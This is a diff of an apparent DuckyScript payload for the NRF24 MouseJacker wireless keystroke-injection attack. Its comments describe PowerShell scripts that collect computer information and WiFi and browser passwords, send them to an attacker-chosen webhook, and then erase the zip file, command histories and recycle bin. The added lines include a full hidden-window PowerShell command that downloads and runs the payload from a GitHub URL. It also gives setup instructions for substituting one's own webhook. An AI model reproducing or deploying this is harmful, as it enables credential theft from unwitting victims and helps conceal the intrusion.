@@ -1,22 +1,31 @@
-REM NOTE: Run the script (or just download the zip file) and make sure to replace the webhook in the .ps1 files with your own. They currently do not link to anything. 
-REM IMPORTANT: Also - MAKE SURE TO REMOVE THE '#' FROM THE LINE:
-REM THIS  line (#88)   ->   #rm $D\E.zip -r -Force -ErrorAction SilentlyContinue;  
-REM ATTENTION: in EACH .ps1 file.
-REM ADVISED: I COMMENTED IT OUT SO THAT YOU CAN EASILY OBTAIN ALL OF THE .ps1 FILES AND ALTER THE WEBHOOK.  IF YOU LEAVE IT AS IT IS IT WILL NOT REMOVE THE .zip FOLDER WHEN THE SCRIPT CLEANS UP
+REM What does this do?
+REM The ps1 files will download a zip folder to your temp directory. It will extract the contents into a created folder,
+REM ". . .\temp\pass."
+REM Then depending on which file you choose it will grab computer info, WiFi and browser passwords, send the resulting information to your webhook and then delete the pass folder, the zip file, clear PS history REM and cmd line history as well as empty the recyling bin. 
 
+
+
+REM NOTE: Run the script (or just download the zip file) and make sure to replace the webhook in the .ps1 files with your own. They currently do not link to anything. 
+REM IMPORTANT: Also - MAKE SURE TO REMOVE THE '#' FROM:
+REM THIS  line ->   "#rm $D\E.zip -r -Force -ErrorAction SilentlyContinue;"  in EACH .ps1 file.
+REM BE ADVISED: I COMMENTED IT OUT SO THAT YOU CAN EASILY OBTAIN ALL OF THE .ps1 FILES AND ALTER THE WEBHOOK.  IF YOU LEAVE IT AS IT IS IT WILL NOT REMOVE THE .zip File WHEN THE SCRIPT CLEANS UP
 REM - Once alterations have been comleted re-zip and upload the .zip file to your own hosting service and make sure to change the URL in this file (below) in order to obtain your altered .zip file.
 
 
-REM 09/10/2024: Compiled by Luciferseamus - There are two exfil files to choose from.
-REM 1. - pubI.ps1 = (pub)lic Information. Needs to have the Webhook info updated; Will only send computer identification information to the webhook of your choosing.
-REM 2. - pubI+P.ps1 (pub)lic Information + (P)asswords. Needs to have the Webhook info updated; Will not only send computer identification information to the webhook but also WiFi and browser (chrome and edge) passwords.
-REM 09/05/2024: - This will grab just the computer Info and send it to a webhook so you can identify the target
-REM I decided to make this specifically for use the NRF24 MouseJacker for 2 reasons:
-REM 1) You cannot use .js scripts with this mode of attack. 
-REM AND
-REM 2) If you detect a jackable mouse in the surrounding area you may not know who the target is and you may want to find out who the target it before grabbing the passwords.
 
-REM 09/12/2024: Now included in the zip are 2 Wait for Mouse Versions of the original pubI.ps1  (WMpubI.ps1) and pubI+P.ps1 (WMpubI+P.ps1) files.
+REM 1. - pubI.ps1 = (pub)lic (I)nformation. Needs to have the Webhook info updated; Will only send computer identification information to the webhook of your choosing.
+REM 2. - pubI+P.ps1 (pub)lic (I)nformation + (P)asswords. Needs to have the Webhook info updated; Will not only send computer identification information to the webhook 
+REM but also WiFi and browser (chrome and edge) passwords.
+
+
+
+REM I decided to make this specifically for use the NRF24 MouseJacker for 3 reasons:
+REM 1) The original "browser" and "all_exfil" scripts are fantastic!
+REM However,
+REM 2) You cannot use .js scripts with this mode of attack. 
+REM AND
+REM 3) If you detect a jackable mouse in the surrounding area you may not know who the target is and you may want to find out who the target it before grabbing the passwords.
+
 
 
 REM #############################################################################################################################################
@@ -31,5 +40,11 @@ REM# 				#2) = WMpubI.ps1 - comp (I)nformation only; 60 seconds after Mouse Move
 REM#				#3) = pubI+P.ps1 - comp (I)nfo (+) (P)asswords.
 REM#				#4) = WMpubI+P.ps1 - comp (I)nfo (+) (P)asswords; 60 seconds after Mouse Movement
 REM
-REM
-STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";mkdir -F -P $D\pass;iwr 'https://github.com/lucifers
+REM		 								   __Remember to update the URL below to reflect your zip's loacation__
+STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";mkdir -F -P $D\pass;iwr 'https://github.com/luciferseamus/Exfil/raw/main/public/PubE.zip' -O $D\E.zip;Expand-Archive "$D\E.zip" -Des $D\pass -Force;cd $D\pass;.\'pubI.ps1'
+ENTER
+
+REM CHANGES:
+REM 09/05/2024: - This will grab just the computer Info and send it to a webhook so you can identify the target
+REM 09/10/2024: Compiled by Luciferseamus - There are now two exfil files to choose from.
+REM 09/12/2024: Now included in the zip are now 2 additional Wait for Mouse Versions of the original pubI.ps1  (WMpubI.ps1) and pubI+P.ps1 (WMpubI+P.ps1) files.
